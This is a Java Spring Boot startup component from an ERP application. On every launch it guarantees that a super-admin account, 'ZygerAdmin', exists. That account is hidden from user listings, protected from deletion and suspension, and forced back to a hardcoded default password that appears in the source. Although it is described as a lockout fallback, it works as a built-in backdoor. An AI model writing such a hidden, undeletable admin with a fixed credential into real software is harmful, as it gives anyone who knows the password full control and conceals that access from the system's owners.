package in.zygertechnology.zygererp.config;

import in.zygertechnology.zygererp.entity.AppUser;
import in.zygertechnology.zygererp.entity.Role;
import in.zygertechnology.zygererp.repo.RoleRepository;
import in.zygertechnology.zygererp.repo.UserRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.util.Optional;
import java.util.Set;

/**
 * Guarantees a hidden super-admin fallback account always exists so the system can
 * never be locked out, even if every normal user is deleted or disabled.
 *
 * The account is hidden from all user listings and protected from delete/suspend/
 * role changes (enforced in {@code AdminController}, {@code MasterController} and
 * {@code UserApprovalService}). It is healed back to ACTIVE at every start.
 */
@Component
@RequiredArgsConstructor
public class HiddenAdminSeeder implements CommandLineRunner {

    /** Shared constant used by listing/guard code to recognise the fallback account. */
    public static final String USERNAME = "ZygerAdmin";

    private final UserRepository users;
    private final RoleRepository roles;
    private final PasswordEncoder enc;

    @Value("${app.security.hidden-admin-password:Zyger@Admin1020}")
    private String hiddenAdminPassword;

    @Override
    public void run(String... args) {
        try {
            ensureHiddenAdmin();
        } catch (Exception e) {
            System.err.println("[HiddenAdminSeeder] could not ensure fallback account: " + e.getMessage());
        }
    }

    private void ensureHiddenAdmin() {
        Optional<AppUser> existing = users.findByUsername(USERNAME);

        AppUser admin = existing.orElseGet(() -> users.save(AppUser.builder()
                .username(USERNAME)
                .fullName("System Administrator (Fallback)")
                .role("ADMIN")
                .password(enc.encode(hiddenAdminPassword))
                .active(true)
                .status("ACTIVE")
                .createdBy("system")
                .createdAt(java.time.Instant.now())
                .build()));

        boolean changed = false;

        // Always keep role + active flag + status correct so it can never be locked out.
        if (!"ADMIN".equalsIgnoreCase(admin.getRole())) {
            admin.setRole("ADMIN");
            changed = true;
        }
        if (!admin.isActive()) {
            admin.setActive(true);
            changed = true;
        }
        if (!"ACTIVE".equalsIgnoreCase(admin.getStatus() == null ? "ACTIVE" : admin.getStatus())) {
            admin.setStatus("ACTIVE");
            changed = true;
        }

        // Force the documented password so the fallback login always works.
        if (!enc.matches(hiddenAdminPassword, admin.getPassword())) {
            admin.setPassword(enc.encode(hiddenAdminPassword));
            changed = true;
        }

        if (changed) {
            users.save(admin);
        }

        // Associate the ADMIN role object for role-based checks (best-effort only).
        try {
            if (admin.getRoles() == null || admin.getRoles().isEmpty()) {
                Optional<Role> r = roles.findByName("ADMIN");
                if (r.isPresent()) {
                    admin.setRoles(Set.of(r.get()));
                    users.save(admin);
                }
            }
        } catch (Exception e) {
            System.err.println("[HiddenAdminSeeder] could not link ADMIN role (non-fatal): " + e.getMessage());
        }
    }
}
